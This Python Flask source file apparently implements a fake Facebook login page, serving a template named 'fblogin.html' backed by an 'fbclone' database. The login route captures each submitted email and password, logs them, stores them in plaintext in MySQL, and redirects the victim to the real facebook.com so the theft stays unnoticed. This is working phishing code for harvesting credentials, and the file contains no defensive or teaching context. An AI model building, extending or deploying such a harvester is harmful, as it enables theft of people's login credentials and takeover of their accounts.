from flask import Flask, render_template, request
import mysql.connector
from flask import redirect, url_for



app = Flask(__name__)

def get_db_connection():
    return mysql.connector.connect(
        host='localhost',
        user='root',
        password='',  # Add your root password here if any
        database='fbclone'  # Your DB name in XAMPP
    )

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')

        print(f"Received email: {email}, password: {password}")  # Debug

        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO users (email, password) VALUES (%s, %s)",
                (email, password)
            )
            conn.commit()
            cursor.close()
            conn.close()
            print("Insert successful")
            return redirect("https://www.facebook.com")
        except Exception as e:
            print(f"Database error: {e}")
            return "Failed to save login info."

    # GET request
    return render_template('fblogin.html')
@app.route('/success')
def login_success():
    return "<h2>Login info saved successfully!</h2>"


if __name__ == '__main__':
    app.run(debug=True)
